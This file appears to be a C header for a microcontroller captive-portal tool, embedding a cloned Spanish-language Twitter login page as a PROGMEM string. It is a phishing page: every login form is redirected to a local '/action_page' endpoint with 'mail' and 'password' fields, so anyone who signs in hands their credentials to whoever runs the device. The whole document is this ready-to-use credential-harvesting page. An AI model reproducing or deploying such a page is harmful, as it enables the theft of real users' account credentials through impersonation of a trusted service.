const char TWITTER_page[] PROGMEM = R"=====(
<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="utf-8">
	<title>Iniciar sesión en Twitter</title>
	<link rel="stylesheet" href="https://abs.twimg.com/a/1566173970/css/t1/twitter_core.bundle.css" class="coreCSSBundles">
  	<link rel="stylesheet" class="moreCSSBundles" href="https://abs.twimg.com/a/1566173970/css/t1/twitter_more_1.bundle.css">
  	<link rel="stylesheet" class="moreCSSBundles" href="https://abs.twimg.com/a/1566173970/css/t1/twitter_more_2.bundle.css">
</head>
<body>
<div id="doc" data-at-shortcutkeys="{&quot;Enter&quot;:&quot;Abrir detalles del Tweet&quot;,&quot;o&quot;:&quot;Expandir foto&quot;,&quot;/&quot;:&quot;Buscar&quot;,&quot;?&quot;:&quot;Este men\u00fa&quot;,&quot;j&quot;:&quot;Siguiente Tweet&quot;,&quot;k&quot;:&quot;Tweet anterior&quot;,&quot;Space&quot;:&quot;Desplazar hacia abajo&quot;,&quot;.&quot;:&quot;Cargar Tweets nuevos&quot;,&quot;gu&quot;:&quot;Ir al usuario\u2026&quot;}" class="route-login login-responsive">
        <div class="topbar js-topbar">
    


    <div class="global-nav global-nav--newLoggedOut" data-section-term="top_nav">
      <div class="global-nav-inner">
        <div class="container">

          
<ul class="nav js-global-actions" role="navigation" id="global-actions">
  <li id="global-nav-home" class="home" data-global-action="home">
    <a class="js-nav js-tooltip js-dynamic-tooltip" data-placement="bottom" href="/" data-component-context="home_nav" data-nav="home" data-original-title="">
      <span class="Icon Icon--bird Icon--large"></span>
      <span class="text" aria-hidden="true">Inicio</span>
      <span class="u-hiddenVisually a11y-inactive-page-text">Inicio</span>
      <span class="u-hiddenVisually a11y-active-page-text">Inicio, página actual.</span>
    </a>
  </li>
    <li id="global-nav-about" class="about" data-global-action="about">
      <a class="js-tooltip js-dynamic-tooltip" data-placement="bottom" href="/about" target="_blank" data-component-context="about_nav" data-nav="about" rel="noopener">
        <span class="text">Sobre nosotros</span>
      </a>
    </li>
</ul>
<div class="pull-right nav-extras">

  <ul class="nav secondary-nav language-dropdown">
    <li class="dropdown js-language-dropdown">
      <a href="#supported_languages" class="dropdown-toggle js-dropdown-toggle" role="button" aria-haspopup="true">
        <small>Idioma:</small> <span class="js-current-language">Español</span> <b class="caret"></b>
      </a>
      <div class="dropdown-menu dropdown-menu--rightAlign is-forceRight">
        <div class="dropdown-caret right">
          <span class="caret-outer"> </span>
          <span class="caret-inner"></span>
        </div>
      </div>
      <div class="js-front-language">
        <form action="/action_page" class="t1-form language" method="POST">
          <input type="hidden" name="lang"> <input type="hidden" name="redirect">
          <input type="hidden" name="authenticity_token" value="4f41a47c73080bfc961e0604c629d123bdb027ab">
        </form>
      </div>
    </li>
  </ul>

    <ul class="nav secondary-nav session-dropdown" id="session">
      <li class="dropdown js-session">
          <a href="/action_page" class="dropdown-toggle js-dropdown-toggle dropdown-signin" role="button" id="signin-link" data-nav="login" aria-haspopup="true">
            <small>¿Tienes cuenta?</small> <span class="emphasize"> Iniciar sesión</span><span class="caret"></span>
          </a>
          <div class="dropdown-menu dropdown-form dropdown-menu--rightAlign is-forceRight" id="signin-dropdown">
            <div class="dropdown-caret right"> <span class="caret-outer"></span> <span class="caret-inner"></span> </div>
            <div class="signin-dialog-body">
              <div>¿Tienes cuenta?</div>
<form action="/action_page" method="post" data-component="login_callout" data-element="form">
  <div class="LoginForm-input LoginForm-username">
    <input type="text" class="text-input email-input" name="mail" placeholder="Teléfono, correo electrónico o nombre de usuario">
  </div>

  <div class="LoginForm-input LoginForm-password">
    <input type="password" class="text-input" name="password" placeholder="Contraseña">
    
  </div>

    <div class="LoginForm-rememberForgot">
      <label>
        <input type="checkbox" value="1" name="remember_me" checked="checked">
        <span>Recordar mis datos</span>
      </label>
      <span class="separator">·</span>
      <a class="forgot" href="/account/begin_password_reset" rel="noopener">¿Olvidaste tu contraseña?</a>
    </div>

  <input type="submit" class="EdgeButton EdgeButton--primary EdgeButton--medium submit js-submit" value="Iniciar sesión">

    <input type="hidden" name="return_to_ssl" value="true">

      <script src="/i/js_inst?c_name=ui_metrics" async=""></script>
</form>
              <hr>
              <div class="signup SignupForm">
                <div class="SignupForm-header">¿Nuevo en Twitter?</div>
                <a href="https://twitter.com/signup" role="button" class="EdgeButton EdgeButton--secondary EdgeButton--medium u-block js-signup" data-component="signup_callout" data-element="dropdown">Regístrate
                </a>
              </div>
            </div>
          </div>
      </li>
    </ul>
</div>

        </div>
      </div>
    </div>
</div>


        <div id="page-outer">
          <div id="page-container" class="AppContent wrapper wrapper-login">
              
            <div class="page-canvas">

  <div class="signin-wrapper" data-login-message="">
    <h1>Inicia sesión en Twitter</h1>
    <form action="/action_page" class="t1-form clearfix signin js-signin" method="post">
      <fieldset>

  <legend class="visuallyhidden">Iniciar sesión</legend>

  <div class="clearfix field">
    <input class="js-username-field email-input js-initial-focus" type="text" name="mail" autocomplete="on" value="" placeholder="Teléfono, correo o usuario">
  </div>
  <div class="clearfix field">
    <input class="js-password-field" type="password" name="password" placeholder="Contraseña">
  </div>

  <input type="hidden" value="4f41a47c73080bfc961e0604c629d123bdb027ab" name="authenticity_token">

      <input type="hidden" name="ui_metrics" autocomplete="off" value="{&quot;rf&quot;:{&quot;ca194e42c4acae83c39fa108801a514e6a6b3c01b46fd562037074678df3a399&quot;:31,&quot;e5861354c39ba552dde5904ee6e16d82b62ab184ca1fcce736dfe19592e3779e&quot;:-30,&quot;f4789abff7268e425183f71419718d52f68cffac6fc9a7cd73ac1c2b02ff1c2e&quot;:-30,&quot;d3794f947d0906a693643a3b2c41ec7cc15cb9cc284913eaa30e76f42b60c94b&quot;:127},&quot;s&quot;:&quot;5nq8yeI8FtVcwsjVKTa2cUgPzjAR9Y4TRVRG1GmYQ6bseZPYAKF9mBpEtAqBIsTAsfr1MsRwyc4ikRpkIC02UYGY4_F6LRPe04eO54Dot0ZIJsUW6cIobbqknejMsQ3TRQyXtfrfOjNPTFfTMqmIDuXdS85tvAgeCRDjflwSrwO0QRw9trV0N3RGTdyVx03UES_YccYAs70ybDRXYJnATKTYKUeD5CqMWc6O7LADiv6nfV2P4gSUOwreI6YAM89-OmUde1nViX0-A-ydM9G80hh_X-iR-vO-ke2Vf-80cevwrU0Dg_8aor7EYk42b1m8-aJiku35AQSU86tuMCmYzgAAAWzNaf8E&quot;}">
      <script src="/i/js_inst?c_name=ui_metrics" async=""></script>

</fieldset>

      <div class="captcha js-captcha">
      </div>
      <div class="clearfix">

  <button type="submit" class="submit EdgeButton EdgeButton--primary EdgeButtom--medium">Iniciar sesión</button>

  <div class="subchck">
    <label class="t1-label remember">
      <input type="checkbox" value="1" name="remember_me" checked="checked">
      Recordar mis datos
      <span class="separator">·</span>
      <a class="forgot" href="/account/begin_password_reset" rel="noopener">¿Olvidaste tu contraseña?</a>
    </label>
  </div>
</div>

    </form>
  </div>

  <div class="clearfix mobile has-sms">
    <p class="signup-helper">
      ¿Nuevo en Twitter?
      <a id="login-signup-link" href="https://twitter.com/signup">Regístrate ahora »</a>
    </p>
    <p class="sms-helper">
      ¿Ya usas Twitter por SMS?
      <a href="/account/complete">Activa tu cuenta »</a>
    </p>
  </div>

</div>

          </div>
        </div>
    </div>
</body>
</html>
)=====";
